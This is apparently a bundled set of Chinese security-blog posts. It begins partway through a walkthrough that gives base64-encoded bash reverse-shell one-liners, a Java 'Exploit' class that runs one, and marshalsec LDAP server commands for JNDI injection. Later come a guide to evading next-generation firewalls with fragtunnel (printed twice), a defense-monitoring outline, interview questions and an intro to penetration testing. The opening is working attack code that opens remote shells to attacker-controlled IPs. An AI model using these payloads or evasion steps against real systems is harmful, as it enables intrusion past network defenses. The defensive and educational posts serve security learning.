bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjMxLjI0MS80NDQ0MyAwPiYx}|{base64,-d}|{bash,-i}
\`\`\`
### 编写恶意类为了在LDAP服务中进行使用

\`\`\`java
import java.lang.Runtime;
import java.lang.Process;

public class Exploit {
    public Exploit() {
        try {
            Runtime.getRuntime().exec("/bin/bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjIwMC4xMzEvNzc3NyAwPiYx}|{base64,-d}|{bash,-i}");
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public static void main(String[] argv) {
        Exploit e = new Exploit();
    }
}
\`\`\`
### 编译
    \`javac .\\Exploit.java\`
### 开启服务转发
![alt text](../assets/img/image-90.png)

> 实际应用过程中需要使用公网来反弹，或者端口映射
   
## 搭建服务器1389为LDAP服务的端口
   
现在我们在攻击机marshalsec-0.0.3-SNAPSHOT-all.jar所在目录开启LDAP监听，命令中的1389为LDAP服务的端口
    
[Repo](https://github.com/mbechler/marshalsec.git)

\`git clone https://github.com/mbechler/marshalsec.git\`


## 开启服务

![alt text](../assets/img/image-91.png)

![alt text](../assets/img/image-92.png)
    
\`\`\`bash
java -cp target/marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer "http://192.168.31.241:8080/#Exploit" 1389
\`\`\`
![alt text](../assets/img/image-93.png)

## 发送请求
![alt text](../assets/img/image-95.png)

## 获取shell
![alt text](../assets/img/image-94.png)`,we=`---
title: 绕过下一代防火墙 # 文章名称
tags: [Sec,Firewall]
categories: [Device,Firewall]
image:
    path: ../assets/img/image-96.png
---


防火墙是网络安全的关键部分，它充当受信任的内部网络和不受信任的外部网络（如 Internet）之间的屏障。根据预定义的安全规则监控和控制传入和传出的网络流量。

防火墙可以作为硬件设备、软件应用程序或两者的组合来实现。它们有多种用途：

1. **存取控制：** 防火墙根据配置的规则来调节允许或阻止哪些网络连接。
2. **威胁预防：** 它们可以防止各种外部威胁，例如恶意软件、病毒和潜在的黑客攻击。
3. **流量过滤：** 防火墙可以配置为根据各种标准允许或阻止特定类型的网络流量，包括：

	- 源 IP 地址和目标 IP 地址
	- 端口号
	- 协议
	- 应用层数据

4. **日志记录和监控：** 许多防火墙提供网络活动的详细日志，使安全团队能够检测和响应潜在威胁。

5. **网络地址转换 （NAT）：** 一些防火墙执行 NAT，这有助于向外部网络隐藏内部网络地址，从而增加额外的安全层。

现代防火墙超越了简单的数据包过滤。它们结合了深度数据包检测和应用程序级过滤等高级功能，以针对复杂的网络威胁提供更全面的保护。

在本文中，我们将重点介绍在 OSI 模型的第 7 层（也称为应用程序层）运行的防火墙。

# 设计缺陷

当您了解下一代防火墙 （NGFW） 的工作原理时，您可能会注意到一些有趣的事情。假设防火墙规则为**只有组 A 可以使用 Web 端口（80 和 443）**。使用 nmap 等工具进行初始端口扫描可能会显示许多开放端口，这可能会误导观察者认为防火墙配置错误或无效。但是，当尝试连接到那些看起来打开的端口时，连接很快就会意外断开。

此行为的一个具体示例可以在 \`Cisco Firepower \`威胁防御 （FTD） 中看到，它使用 Snort 引擎进行深度数据包检测。根据 Cisco 文档：

“为了让 \`Snort \`引擎确定应用程序，它必须检查几个数据包（通常为 3-10 个，具体取决于应用程序解码器）。因此，允许某些数据包通过 FTD 并到达目的地。允许的数据包仍根据“在确定访问控制规则之前使用的 \`Access Policy > Advanced > Intrusion Policy\`”选项进行入侵策略控制。

这意味着，即使连接似乎已启动，防火墙也可能在解析这些初始数据包后阻止它。这种方法允许防火墙对流量做出更明智的决策，但也可能导致出现实际上无法访问的“开放”端口。

![](https://miro.medium.com/v2/resize:fit:952/0*dCFT-ep3rUNhCjGj)

要了解这种情况是如何发生的，了解 TCP 连接的工作原理会很有帮助。

![](https://miro.medium.com/v2/resize:fit:700/0*lOZrpK46ED6M3_z0)

建立 TCP 连接：

1. **SYN：** 客户端发送一个序列号为随机 A 的 SYN 数据包。

2. **SYN-ACK：** 服务器以 SYN-ACK 响应。确认编号为 A + 1，并将其自己的序列号设置为 B。

3. **Acknowledgment：** 客户端发送序号为 A + 1 且鸣谢编号为 B + 1 的 ACK。

从现在开始，应用程序可以开始通过创建的会话进行通信和发送数据。要关闭连接，要终止通信的终端节点将启动连接终止：

终止 TCP 连接：

1. **FIN：** 主机发送 FIN 数据包以开始关闭连接。

2. **Acknowledgment：** 另一位主持人确认 FIN。

3. **FIN：** 第二台主机在准备关闭时发送自己的 FIN。

4. **Acknowledgment：** 第一个主机发送最终 ACK。

# 回归基础

到目前为止，我们知道 IPS/IDS 引擎最初会允许一些数据包通过，直到它确定它是否是恶意/恶意流量。因此，我们可以改变常见的编程实践并利用此功能。

套接字调度的一般架构如下所示：

![](https://miro.medium.com/v2/resize:fit:1400/0*n2MMEogst5L7XF46)

我们可以连接、发送数据、接收响应、关闭套接字并重复。这有助于避免被 IDS/IPS 系统检测到，否则可能会阻止连接。修改后的算法如下所示：

![](https://miro.medium.com/v2/resize:fit:1400/0*0Rq3FOJj6U9pkb1P)

这正是 \`Fragtunnel\` 所做的！

## Fragtunnel

这种基于 Python 的 TCP 隧道工具提供了一种绕过下一代防火墙的独特方法：

**基本功能：**

1. 它不同于传统代理或标准隧道。
2. 允许将应用程序流量路由到目标服务器，避免 NGFW 检测。

**操作机制：**

1. **数据碎片化：** 应用程序的传入数据被拆分为较小的块。
2. **多会话传输：** 每个片段都通过单独的 TCP 会话单独发送。
3. **数据重组：** 片段在目标位置重新组合以重建原始数据。
4. **最终交付：** 重新组合的数据将转发到预期目标。

## 安装

要开始使用，只需从 GitHub 下载脚本并运行它。但是，请注意，需要设置隧道服务器和隧道客户端才能使脚本正常工作。

### 服务器
在服务器上执行以下步骤：

\`\`\`bash
git clone https://github.com/efeali/fragtunnel.git
\`\`\`

\`\`\`bash
cd fragtunnel/
\`\`\`

\`\`\`bash
 sudo python3 fragtunnel.py -b 127.0.0.1：80 -v**
\`\`\`
- **-b， –bind**：指定 IP 地址和端口，隧道服务器将在其上侦听传入连接。
- **v， –verbose**：启用 verbose 模式，在运行隧道应用程序时提供更详细的输出或日志记录信息。

### 客户端：
\`\`\`bash
sudo Python fragtunnel.py -p 1234 -t ：80 -T ：80 -v
\`\`\`

- -p、–port：指定本地应用程序将侦听以建立连接的端口号。
- -t， –target：指定本地应用程序要连接到的目标服务器或服务的 IP 地址和端口。
- -T， –Tunnel：指定隧道服务器的 IP 地址和端口，以便于本地应用程序和目标服务器之间的连接。

一旦 \`tunnel \`客户端执行并连接到 \`tunnel\` 服务器，您就可以与目标进行交互，就像直接在计算机上本地访问它一样。

![](https://miro.medium.com/v2/resize:fit:1400/0*qqUHgxReL14a9lXi)

![](https://miro.medium.com/v2/resize:fit:1400/0*ljeH8mwFDWsGjslX)

如果我们运行 tcpdump，我们会注意到所有通信都是与服务器进行的，在本例中为 AWS。

![](https://miro.medium.com/v2/resize:fit:1400/0*20hXmz0-tmMvVrN8)

# 总结

在许多情况下，当我们进行侦察时，我们注意到我们可以扫描服务器并获取端口信息，但是当我们尝试连接到系统时，它被防火墙阻止了。对这些下一代系统的工作原理有一点了解可以帮助我们克服它们。

大多数下一代防火墙使用的 IDS/IPS 引擎允许一些数据包到达目的地，同时收集足够的信息来判断是允许还是阻止流量。这是一个设计缺陷，可以利用它让我们使用 \`fragtunnel \`等工具不受限制地访问服务器。`,Pe=`---
title: 绕过下一代防火墙 # 文章名称
tags: [Sec,Firewall]
categories: [Device,Firewall]
image:
    path: ../assets/img/image-96.png
---


防火墙是网络安全的关键部分，它充当受信任的内部网络和不受信任的外部网络（如 Internet）之间的屏障。根据预定义的安全规则监控和控制传入和传出的网络流量。

防火墙可以作为硬件设备、软件应用程序或两者的组合来实现。它们有多种用途：

1. **存取控制：** 防火墙根据配置的规则来调节允许或阻止哪些网络连接。
2. **威胁预防：** 它们可以防止各种外部威胁，例如恶意软件、病毒和潜在的黑客攻击。
3. **流量过滤：** 防火墙可以配置为根据各种标准允许或阻止特定类型的网络流量，包括：

	- 源 IP 地址和目标 IP 地址
	- 端口号
	- 协议
	- 应用层数据

4. **日志记录和监控：** 许多防火墙提供网络活动的详细日志，使安全团队能够检测和响应潜在威胁。

5. **网络地址转换 （NAT）：** 一些防火墙执行 NAT，这有助于向外部网络隐藏内部网络地址，从而增加额外的安全层。

现代防火墙超越了简单的数据包过滤。它们结合了深度数据包检测和应用程序级过滤等高级功能，以针对复杂的网络威胁提供更全面的保护。

在本文中，我们将重点介绍在 OSI 模型的第 7 层（也称为应用程序层）运行的防火墙。

# 设计缺陷

当您了解下一代防火墙 （NGFW） 的工作原理时，您可能会注意到一些有趣的事情。假设防火墙规则为**只有组 A 可以使用 Web 端口（80 和 443）**。使用 nmap 等工具进行初始端口扫描可能会显示许多开放端口，这可能会误导观察者认为防火墙配置错误或无效。但是，当尝试连接到那些看起来打开的端口时，连接很快就会意外断开。

此行为的一个具体示例可以在 \`Cisco Firepower \`威胁防御 （FTD） 中看到，它使用 Snort 引擎进行深度数据包检测。根据 Cisco 文档：

“为了让 \`Snort \`引擎确定应用程序，它必须检查几个数据包（通常为 3-10 个，具体取决于应用程序解码器）。因此，允许某些数据包通过 FTD 并到达目的地。允许的数据包仍根据“在确定访问控制规则之前使用的 \`Access Policy > Advanced > Intrusion Policy\`”选项进行入侵策略控制。

这意味着，即使连接似乎已启动，防火墙也可能在解析这些初始数据包后阻止它。这种方法允许防火墙对流量做出更明智的决策，但也可能导致出现实际上无法访问的“开放”端口。

![](https://miro.medium.com/v2/resize:fit:952/0*dCFT-ep3rUNhCjGj)

要了解这种情况是如何发生的，了解 TCP 连接的工作原理会很有帮助。

![](https://miro.medium.com/v2/resize:fit:700/0*lOZrpK46ED6M3_z0)

建立 TCP 连接：

1. **SYN：** 客户端发送一个序列号为随机 A 的 SYN 数据包。

2. **SYN-ACK：** 服务器以 SYN-ACK 响应。确认编号为 A + 1，并将其自己的序列号设置为 B。

3. **Acknowledgment：** 客户端发送序号为 A + 1 且鸣谢编号为 B + 1 的 ACK。

从现在开始，应用程序可以开始通过创建的会话进行通信和发送数据。要关闭连接，要终止通信的终端节点将启动连接终止：

终止 TCP 连接：

1. **FIN：** 主机发送 FIN 数据包以开始关闭连接。

2. **Acknowledgment：** 另一位主持人确认 FIN。

3. **FIN：** 第二台主机在准备关闭时发送自己的 FIN。

4. **Acknowledgment：** 第一个主机发送最终 ACK。

# 回归基础

到目前为止，我们知道 IPS/IDS 引擎最初会允许一些数据包通过，直到它确定它是否是恶意/恶意流量。因此，我们可以改变常见的编程实践并利用此功能。

套接字调度的一般架构如下所示：

![](https://miro.medium.com/v2/resize:fit:1400/0*n2MMEogst5L7XF46)

我们可以连接、发送数据、接收响应、关闭套接字并重复。这有助于避免被 IDS/IPS 系统检测到，否则可能会阻止连接。修改后的算法如下所示：

![](https://miro.medium.com/v2/resize:fit:1400/0*0Rq3FOJj6U9pkb1P)

这正是 \`Fragtunnel\` 所做的！

## Fragtunnel

这种基于 Python 的 TCP 隧道工具提供了一种绕过下一代防火墙的独特方法：

**基本功能：**

1. 它不同于传统代理或标准隧道。
2. 允许将应用程序流量路由到目标服务器，避免 NGFW 检测。

**操作机制：**

1. **数据碎片化：** 应用程序的传入数据被拆分为较小的块。
2. **多会话传输：** 每个片段都通过单独的 TCP 会话单独发送。
3. **数据重组：** 片段在目标位置重新组合以重建原始数据。
4. **最终交付：** 重新组合的数据将转发到预期目标。

## 安装

要开始使用，只需从 GitHub 下载脚本并运行它。但是，请注意，需要设置隧道服务器和隧道客户端才能使脚本正常工作。

### 服务器
在服务器上执行以下步骤：

\`\`\`bash
git clone https://github.com/efeali/fragtunnel.git
\`\`\`

\`\`\`bash
cd fragtunnel/
\`\`\`

\`\`\`bash
 sudo python3 fragtunnel.py -b 127.0.0.1：80 -v**
\`\`\`
- **-b， –bind**：指定 IP 地址和端口，隧道服务器将在其上侦听传入连接。
- **v， –verbose**：启用 verbose 模式，在运行隧道应用程序时提供更详细的输出或日志记录信息。

### 客户端：
\`\`\`bash
sudo Python fragtunnel.py -p 1234 -t ：80 -T ：80 -v
\`\`\`

- -p、–port：指定本地应用程序将侦听以建立连接的端口号。
- -t， –target：指定本地应用程序要连接到的目标服务器或服务的 IP 地址和端口。
- -T， –Tunnel：指定隧道服务器的 IP 地址和端口，以便于本地应用程序和目标服务器之间的连接。

一旦 \`tunnel \`客户端执行并连接到 \`tunnel\` 服务器，您就可以与目标进行交互，就像直接在计算机上本地访问它一样。

![](https://miro.medium.com/v2/resize:fit:1400/0*qqUHgxReL14a9lXi)

![](https://miro.medium.com/v2/resize:fit:1400/0*ljeH8mwFDWsGjslX)

如果我们运行 tcpdump，我们会注意到所有通信都是与服务器进行的，在本例中为 AWS。

![](https://miro.medium.com/v2/resize:fit:1400/0*20hXmz0-tmMvVrN8)

# 总结

在许多情况下，当我们进行侦察时，我们注意到我们可以扫描服务器并获取端口信息，但是当我们尝试连接到系统时，它被防火墙阻止了。对这些下一代系统的工作原理有一点了解可以帮助我们克服它们。

大多数下一代防火墙使用的 IDS/IPS 引擎允许一些数据包到达目的地，同时收集足够的信息来判断是允许还是阻止流量。这是一个设计缺陷，可以利用它让我们使用 \`fragtunnel \`等工具不受限制地访问服务器。`,Te=`---
title: 态势感知安全检测 
tags: [网络安全,态势感知]
categories: [态势感知]
mermaid: true
---

# 态势感知安全检测

\`\`\`mermaid
 flowchart TD
    A[开始] --> B[背景与目标]
    B --> C[态势感知部署思路与功能]
    C --> D[态势感知监测实施方法]
    D --> E[攻防实战]
    E --> F[修筑流量监测纵深异构防御战线]
    E --> G[修筑重要系统防御战线]
    E --> H[构建协同预警体系]
    H --> I[应用效果]
    I --> J[后续工作]
    J --> K[结束]
\`\`\`

该文档中提到的具体措施包括：
1. **修筑流量监测纵深异构防御战线**：
    - 了解各流量监测安全产品优缺点，摸排现有流量镜像网中各流量镜像节点的流量情况。
    - 统筹规划不同流量监测系统流量探针的流量分配方案，通过重做map、去重、过滤等手段解决“安全设备丢包、流量镜像网带宽占满”的问题。
    - 收敛对外暴露或跨域暴露的高危端口、弱密码、管理后台等，清理内网失陷机器及违规行为。
2. **修筑重要系统防御战线**：
    - 收集网络日志、安全日志、应用日志、资产信息、威胁情报等5大类数据，包括多种具体日志。
    - 编排数据源监控面板，依据历史基线定义每类数据源的收取频率，对未按时收到的日志进行标红显示并短信告警。
    - 将重要系统（如堡垒机系统、域控服务器、VPN、数据交换系统等）、重要账号加入重点监控范畴。
    - 在条件允许的情况下，对重要系统进行攻击测试，保证对其进行攻击或者变更能触发相关告警。
3. **构建协同预警体系**：
    - 整合实景化攻防技战术的深入研究成果以及强对抗环境下防御手段的创新应用，以智能化的方式实现海量攻击日志数据的自动关联分析，实时监测HW高危事件。
    - 通过API对接威胁情报管理平台，对访问【客户名称】资产的全量互联网IP进行威胁情报匹配，根据匹配结果进行相应处理（加入重点关注清单或立即封禁）。
    - 通过对接蜜罐系统，对攻击者的攻击行为进行捕获，获取攻击者相关信息，提升预警的精准度。
    - 对攻击模型不断迭代，减少误报率和漏报率，实时扩展攻击模型。
    - 提升安全态势感知平台中的数据质量，精准匹配数据模型。
4. **后续工作**：
    - 增加探针部署与各个网络节点，并与二级单位态势感知平台互联互通，建设中国【客户名称】网络安全态势感知一张图。
    - 全面利用安全态势感知平台将SIP、情报、沙箱等多维安全产品集中管控，重点做好防守对抗自动化和安全态势可视化。
        - 防守对抗自动化：通过安全态势感知平台构建演习相关攻击分析场景，快速发现安全事件根源，确定攻击手段及评估攻击损失，实时、精准生成待封禁IP清单；结合安全技术自动化编排与响应，将封禁/解封IP清单下发至两地三中心以及子公司的互联网墙进行实时封禁。
        - 安全态势可视化：在安全态势感知平台设置多维度的安全风险指标，构建安全运营、安全运维为一体的安全态势总览；借助可视化程度高且细粒度、高精度的风险监测模型，及时发现和处置网络中的可疑事件；通过动态描绘攻击及防守趋势图，实现安全风险及态势的全景可视化管控。

`,ye=`---
title: 安全运营思维导图 
tags: [网络安全,安全运营]
categories: [安全运营]
---

# 安全运营思维导图

![alt text](../assets/img/image-98.png)

以下是对文档《安全运营之路》的总结：
1. **对安全运营的理解**：
    - **是什么**：未明确提及。
    - **做什么**：包括满足价值需求和提升成熟度，涉及理论体系与工程框架，以及ATT&CK攻击防御框架。
    - **怎么做**：通过数据驱动，涵盖核心内容如SOC、安全威胁情报简述、安全数据分析平台等。
2. **安全建设篇**：
    - **情报搜集**：包括入侵检测系统等。
    - **安全平台的建设方案**：未明确提及。
    - **情报分析实际研判案例**：未明确提及。
    - **企业风控平台**：未明确提及。
3. **威胁情报篇**：
    - **情报生产**：未明确提及。
    - **情报监控平台**：未明确提及。
    - **情报落地**：包括威胁信息流通与交换、情报驱动的自动化等。
    - **威胁检测与攻击溯源之间的桥梁**：未明确提及。
4. **威胁狩猎篇**：
    - **日志、告警与事件**：未明确提及。
    - **主机应急响应**：包括应急响应防守方视角（蓝队）。
    - **C2通讯的检测与分析**：未明确提及。
    - **黑灰产基础设施**：未明确提及。
    - **网络流量的检测与分析**：未明确提及。
    - **隐蔽通讯的检测与分析**：未明确提及。
    - **具体业务场景下的对抗**：未明确提及。
5. **攻防对抗篇**：
    - **物料与供应链层面的对抗**：未明确提及。
    - **黑灰产对抗**：包括攻击方视角（红队）、数据与算法层面的对抗、紫队视角等。
    - **黑灰产研究相关**：未明确提及。
6. **上游**：
    - **安全运营之路**：未明确提及。
    - **云安全概论**：未明确提及。
7. **中游**：
    - **黑灰产形式**：未明确提及。
    - **云原生与云技术**：未明确提及。
8. **下游**：
    - **云原生漏洞**：未明确提及。
    - **产业链分析**：未明确提及。
9. **业务安全篇**：
    - **云安全篇**：未明确提及。
    - **黑灰产分析**：包括黑词与黑话。
    - **云中的信息搜集**：包括代理与信息隐蔽技术。
    - **容器逃逸**：未明确提及。
    - **站群与僵尸网络技术**：未明确提及。
    - **容器镜像安全**：未明确提及。
    - **应用安全相关**：未明确提及。
10. **扩展内容**：
    - **安全数据分析相关**：未明确提及。
    - **安全学术研究篇**：包括数据驱动安全概论、云环境下的自动化入侵溯源实战。
    - **安全开发篇**：包括同源分析、事件归并、工程化实战思路。
    - **产品设计篇**：包括攻击评估、攻击者画像、基于事件调查的分析能力提升。
    - **攻击者能力**：未明确提及。
    - **攻击者行为**：未明确提及。
    - **安全数据科学篇**：包括TTPs（技战术组合）知识化表达、威胁趋势、预测、威胁狩猎、告警筛选与分析、威胁检测模型、基于数据的威胁检测、基于数据的隐蔽通讯检测、基于数据的代理通信检测（僵尸网络相关）、安全知识图谱、攻击者评估。
    - **研究方向与工程化项目**：未明确提及。


安全运营的理论体系可能涉及以下方面：
1. **价值需求与成熟度**：满足企业或组织的安全需求，提升安全运营的成熟度，以应对各种安全威胁。
2. **ATT&CK攻击防御框架**：可能作为安全运营中的一种参考框架，用于指导攻击防御策略的制定和实施。
3. **数据驱动**：以数据为核心，通过对安全数据的分析和处理，实现对安全威胁的检测、预警和响应。
4. **SOC（安全运营中心）**：作为安全运营的核心组件，负责整合和管理安全信息，协调安全响应工作。
5. **安全威胁情报**：包括情报的搜集、生产、监控、落地等环节，为安全运营提供情报支持。

需要注意的是，以上仅为根据文档内容进行的推测，具体的安全运营理论体系还需要参考更多相关资料和实践经验。


总体而言，文档对安全运营的各个方面进行了概述，但具体内容在总结中大多未明确提及，需要进一步查看文档详细了解。`,Ce=`---
title: 网络安全面试题 
tags: [网络安全,面试]
categories: [面试]
image:
    path: ../assets/img/image-97.png
---

1. **漏洞相关**：
    - **挖洞经历和CTF经历**：要求介绍自认为有趣的相关经历。
    - **常用漏洞**：包括平时用得较多的漏洞及其原理、修复方案，如SQL注入、上传Webshell等。
    - **开源组件高危漏洞**：要求列举所知道的所有相关漏洞。
    - **CVE或POC**：需要描述深入研究过的CVE或POC。
    - **反序列化漏洞**：包括php/java反序列化漏洞的原理和解决方案。
2. **工具相关**：
    - **常用工具**：询问平时使用的工具及其特点。
3. **绕过WAF**：
    - **SQL注入和上传Webshell**：遇到WAF时的应对方法。
4. **系统提权**：
    - **Windows和Linux系统**：阐述提权的思路。
5. **渗透测试**：
    - **获取目标网站真实IP**：介绍绕过CDN获取真实IP的思路。
    - **渗透测试思路**：针对给定网站，阐述渗透测试的思路。
    - **实际渗透测试经历**：可能会询问相关经历。
    - **反弹shell**：常用命令、常反弹的shell类型及原因。
    - **SSRF漏洞**：包括成因、防御、绕过等方面。
    - **SQL注入**：漏洞成因、防范方法、注入方式、利用方式、中间件解析漏洞利用方式、bypass技巧、宽字符注入原理及修复等。
    - **获取webshell的思路**：针对特定注入点，如test.jsp?cid=150，获取webshell的思路。
    - **变形注入的思路**：对于存在SQL注入漏洞的变形注入，提出解决思路。
    - **mysql注入的区别**：mysql 5.0以上和5.0以下网站注入的区别。
    - **sqlmap的使用**：sqlmap对注入点注入以及注入post包的方法。
6. **浏览器知识**：
    - **跨域请求数据**：如何设置跨域请求数据，jsonp的作用。
    - **同源策略**：子域名和顶级域名不同源时的设置方法，同源策略的解释及同源可获取的东西。
    - **JSON和JSONP的区别**：包括JSONP劫持利用方式及修复方案、JSON注入利用方式、Ajax是否遵循同源策略等。
    - **CSP**：CSP是什么以及如何设置。
    - **浏览器安全策略**：不同浏览器（如chrome、firefox、IE）之间安全策略的不同。
    - **HTML5安全特性**：HTML5新的安全特性。
7. **XSS**：
    - **防范XSS漏洞**：在前端和后端的防范方法，以及何处更好及原因。
    - **检测XSS漏洞**：黑盒检测XSS漏洞的方法。
    - **利用XSS盲打漏洞**：在内网且只能内网访问的情况下，利用XSS盲打漏洞的方法。
    - **防御蠕虫**：防御蠕虫的方法，以及在社交类网站中蠕虫可能出现的地方。
    - **XSS持久化**：相关内容。
    - **构造蠕虫的条件**：拥有XSS漏洞时，构造蠕虫所需的其他条件。
    - **XSS的发生场景、定义及修复方式**：相关内容。
8. **CSRF/SSRF**：
    - **区别**：CSRF、SSRF和重放攻击的区别。
    - **防御CSRF的方法**：包括JAVA的防御方式以及token是否一定有用。
    - **CSRF漏洞的本质、定义及修复方式**：相关内容。
    - **SSRF漏洞原理、利用方式及修复方案**：以及Java和PHP的SSRF区别。
9. **XML注入**：
    - **XXE**：XXE是什么以及修复方案。
10. **业务逻辑漏洞**：
    - **类型及修复方式**：至少说出三种业务逻辑漏洞及其修复方式，如找回密码、身份认证、验证码漏洞等。
    - **越权访问**：水平、垂直、未授权越权访问的区别，以及越权问题的自动化检测方法。
11. **Java考察**：
    - **MVC结构和数据流向**：java的MVC结构的作用，数据流向数据库的顺序。
    - **java沙箱**：对java沙箱的了解。
    - **ibats和sql注入**：ibats的参数化查询对sql注入的控制，以及可能造成sql注入的危险方法。
    - **struts2漏洞原理**：两次struts2漏洞的原理。
    - **ongl在payload中的作用**：相关内容。
    - **\\u0023字符编码**：\\u0023是什么字符的16进制编码以及在payload中使用的原因。
    - **执行系统命令的漏洞**：java是否会发生此类漏洞，以及相关的语句和方法。
    - **修复xss漏洞的层级**：在java程序中修复xss漏洞的层级。
    - **xss filter的设置位置**：xss filter在java程序中的设置位置。
    - **java类反射的安全问题**：相关内容。
    - **Java反序列化漏洞**：原理和解决方案。
    - **java框架**：了解的java框架。
12. **PHP考察**：
    - **LFI本地包含漏洞**：原理、代码示例、手工发掘方法、无报错回显时的文件遍历方法。
    - **php反序列化漏洞**：原理和解决方案。
    - **php webshell检测方法**：相关内容。
    - **%00截断的原理**：相关内容。
    - **php.ini的安全特性设置**：相关内容。
    - **php避免错误回显的方法**：相关内容。
13. **常见中间件**：
    - **Redis未授权访问漏洞**：入侵利用方式。
    - **中间件解析漏洞利用方式**：常见的中间件解析漏洞利用方式。
    - **JAVA中间件容器**：常见的中间件容器。
    - **tomcat安全加固**：相关内容。
    - **tomcat重启后的情况**：相关内容。
    - **常见网站服务器中间件容器**：相关内容。
14. **数据库安全**：
    - **mysql表权限**：除增删改查、文件读写外的其他权限。
    - **mysql安全**：mysql安全的做法。
    - **sqlserver public权限提权**：相关内容。
    - **加固降权思路**：Windows、Linux、数据库任选其一的加固降权思路。
    - **mysql用户信息存储**：mysql的用户名密码存放的表以及密码的加密方式。
    - **mysql默认库**：mysql数据库默认的库名。
    - **mysql UDF提权**：5.1以上版本和5.1以下版本的区别及所需条件。
15. **Linux操作系统**：
    - **系统安全加固**：简述Linux系统安全加固需要做的方面。
    - **后门检测工具**：使用的工具来判断系统是否存在后门。
    - **Selinux**：Linux的Selinux是什么以及如何设置。
    - **iptables工作层**：iptables工作在TCP/IP模型中的哪层。
    - **系统防护**：无法升级内核时，保证系统不被已知exp提权的方法。
    - **日志相关**：syslog中的日志类型、安装软件的日志位置、ssh登录日志的查询、syslog日志格式的配置、syslog的查看方式及是否为二进制文件。
    - **应急响应**：Linux服务器被入侵后的应急响应方法。
16. **应急响应**：
    - **后门实现方式**：有哪几种后门实现方式。
    - **webshell检测**：webshell检测的方法思路。
    - **Linux服务器中木马后的应急思路**：相关内容。
    - **新0day应急响应**：遇到新0day（如Struts2）后的应急响应方法。
    - **安全评估和审计**：新业务上线前的安全评估方向，现有系统审计发现安全风险的方向。
17. **其他**：
    - **判断网站CMS的意义**：判断出网站的CMS对渗透的意义。
    - **清理入侵日志**：相关内容。
    - **总结渗透报告及修复方案**：相关内容。
    - **收集目标站注册人邮箱的价值**：在渗透过程中，收集目标站注册人邮箱的价值。
    - **DNS在渗透中的作用**：相关内容。
`,xe=`---
title: 渗透测试
tags:
  - 网络安全
  - 渗透测试
categories:
  - 渗透测试
password: lidefei
---

- # 信息安全概述

---

  [信息安全](https://en.wikipedia.org/wiki/Information_security) （infosec） 是一个广阔的领域。该领域在过去几年中取得了长足的发展和发展。它提供许多专业，包括但不限于：  

- 网络和基础设施安全

- 应用程序安全性

- 安全测试

- 系统审计

- 业务连续性规划

- 数字取证

- 事件检测和响应
  
  简而言之，信息安全是保护数据免受未经授权的访问、更改、非法使用、中断等的做法。信息安全专业人员还会采取行动减少任何此类事件的整体影响。  
  
  数据可以是电子的，也可以是有形的（例如，设计蓝图）或无形的（知识）。在我们的信息安全职业生涯中，一个经常出现的短语是保护“数据的机密性、完整性和可用性”，或 .\`CIA triad\`  

---

- ## 风险管理流程
  
  数据保护必须专注于高效而有效的策略实施，而不会对组织的业务运营和生产力产生负面影响。为此，组织必须遵循一个称为 .此过程包括以下 5 个步骤：\`risk management process\`  
  
  | 步                      | 解释                                                                               |
  | ---------------------- | -------------------------------------------------------------------------------- |
  | \`Identifying the Risk\` | 识别企业面临的风险，例如法律、环境、市场、监管和其他类型的风险。                                                 |
  | \`Analyze the Risk\`     | 分析风险以确定其影响和概率。风险应映射到组织的各种策略、程序和业务流程。                                             |
  | \`Evaluate the Risk\`    | 评估、排序和确定风险的优先级。然后，组织必须决定接受 （不可避免）、避免 （更改计划）、控制 （缓解） 或转移风险 （保险）。                  |
  | \`Dealing with Risk\`    | 尽可能消除或控制风险。这是通过直接与与风险相关的系统或流程的利益干系人沟通来处理的。                                       |
  | \`Monitoring Risk\`      | 必须持续监控所有风险。应持续监控风险，以发现任何可能改变其影响评分的情况变化。\`i.e., from low to medium or high impact\` |
  
  如前所述，信息安全的核心原则是信息保障，或维护数据并确保数据在事件发生时不会以任何方式、形状或形式受到损害。事件可能是自然灾害、系统故障或安全事件。\`CIA\`  

---

- ## 红队 vs. 蓝队
  
  在信息安全中，我们通常会听到术语 和 。用最简单的话来说，The 扮演攻击者的角色，而 the 扮演防御者的角色。\`red team\`\`blue team\`\`red team\`\`blue team\`  
  
  红队成员通常在闯入组织时扮演对手角色，以识别真正的攻击者可能利用的任何潜在弱点来打破组织的防御。红队方面最常见的任务是渗透测试、社会工程和其他类似的进攻技术。  
  
  另一方面，蓝队构成了信息安全工作的大部分。它负责通过分析风险、提出策略、响应威胁和事件以及有效使用安全工具和其他类似任务来加强组织的防御。  

---

- ## 渗透测试人员的作用
  
  安全评估员（网络渗透测试员、Web 应用程序渗透测试员、红队成员等）帮助组织识别其外部和内部网络中的风险。这些风险可能包括网络或 Web 应用程序漏洞、敏感数据泄露、错误配置或可能导致声誉受损的问题。优秀的测试人员可以与客户合作，识别其组织面临的风险，提供有关如何重现这些风险的信息，以及有关缓解或修复测试期间发现的问题的指导。  
  
  评估可以采取多种形式，从针对所有范围内系统和应用程序的白盒渗透测试以识别尽可能多的漏洞，到网络钓鱼评估以评估风险或员工的安全意识，再到围绕场景构建的有针对性的红队评估以模拟真实世界的威胁行为者。  

- 我们必须全面了解组织面临的风险及其环境，以便准确评估和评估测试过程中发现的漏洞。对于信息安全初学者来说，深入了解风险管理流程至关重要。
  
  本模块将重点介绍如何从动手实践的角度开始信息安全和渗透测试，特别是选择和导航渗透测试发行版，了解常见技术和基本工具，学习渗透测试的级别和基础知识，破解我们在 HTB 上的第一个盒子，如何最有效地查找和寻求帮助， 常见的潜在问题，以及如何浏览 Hack the Box 平台。  

- 虽然本模块使用 Hack The Box 平台和故意易受攻击的机器作为示例，但所展示的基本技能适用于任何环境。

- 

- 

- 

## 文件夹结构

在攻击单个机器、实验室或客户端环境时，我们应该在攻击机器上有一个清晰的文件夹结构来保存数据，例如：范围信息、枚举数据、利用尝试的证据、敏感数据（如凭证）以及在侦察、利用和利用后获得的其他数据。示例文件夹结构可能如下所示：

保持井井有条

\`\`\`
DeviLeo@htb[/htb]**$** tree Projects/

Projects/
└── Acme Company
  ├── EPT
  │   ├── evidence
  │   │   ├── credentials
  │   │   ├── data
  │   │   └── screenshots
  │   ├── logs
  │   ├── scans
  │   ├── scope
  │   └── tools
  └── IPT
      ├── evidence
      │   ├── credentials
      │   ├── data
      │   └── screenshots
      ├── logs
      ├── scans
      ├── scope
      └── tools
\`\`\`

